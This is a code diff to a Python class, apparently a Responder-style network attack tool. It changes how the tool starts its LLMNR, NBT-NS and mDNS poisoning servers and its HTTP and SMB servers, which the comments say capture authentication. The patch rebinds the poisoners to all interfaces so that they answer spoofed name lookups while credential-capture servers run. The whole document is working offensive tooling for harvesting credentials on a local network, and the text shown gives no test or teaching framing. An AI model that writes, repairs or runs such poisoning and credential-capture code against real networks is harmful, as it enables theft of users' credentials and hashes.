@@ -142,42 +142,43 @@ class ResponderCapture:
     def start_poisoning(self):
         """Start all poisoning and authentication servers"""
         try:
-            # Start poisoning servers
-            llmnr_server = LLMNRPoisoner((self.interface, self.poisoning_ports['llmnr']), self)
+            # Start poisoning servers - Bind UDP to 0.0.0.0
+            llmnr_server = LLMNRPoisoner(('0.0.0.0', self.poisoning_ports['llmnr']), self) # <-- Changed IP
             llmnr_thread = threading.Thread(target=llmnr_server.serve_forever)
             llmnr_thread.daemon = True
             llmnr_thread.start()
             self.servers.append(llmnr_server)
-            
-            nbtns_server = NBTNSPoisoner((self.interface, self.poisoning_ports['nbt-ns']), self)
+
+            nbtns_server = NBTNSPoisoner(('0.0.0.0', self.poisoning_ports['nbt-ns']), self) # <-- Changed IP
             nbtns_thread = threading.Thread(target=nbtns_server.serve_forever)
             nbtns_thread.daemon = True
             nbtns_thread.start()
             self.servers.append(nbtns_server)
-            
-            mdns_server = MDNSPoisoner((self.interface, self.poisoning_ports['mdns']), self)
+
+            mdns_server = MDNSPoisoner(('0.0.0.0', self.poisoning_ports['mdns']), self) # <-- Changed IP
             mdns_thread = threading.Thread(target=mdns_server.serve_forever)
             mdns_thread.daemon = True
             mdns_thread.start()
             self.servers.append(mdns_server)
-            
-            # Start HTTP server for capturing auth
+
+            # Start HTTP server for capturing auth - Keep bound to specific interface IP
             http_server = HTTPServer((self.interface, self.auth_ports['http']), self)
             http_thread = threading.Thread(target=http_server.serve_forever)
             http_thread.daemon = True
             http_thread.start()
             self.servers.append(http_server)
-            
-            # Start SMB server for capturing auth
+
+            # Start SMB server for capturing auth - Keep bound to specific interface IP
             smb_server = SMBServer((self.interface, self.auth_ports['smb']), self)
             smb_thread = threading.Thread(target=smb_server.serve_forever)
             smb_thread.daemon = True
             smb_thread.start()
             self.servers.append(smb_server)
-            
+
             self.running = True
-            self.logger.info(f"All servers started on {self.interface}")
-            
+            # Log the specific IP used for responses, even though UDP listens on 0.0.0.0
+            self.logger.info(f"Poisoning servers listening. Will respond with IP: {self.interface}")
+
         except Exception as e:
             self.logger.error(f"Error starting servers: {e}")
             self.stop_poisoning()
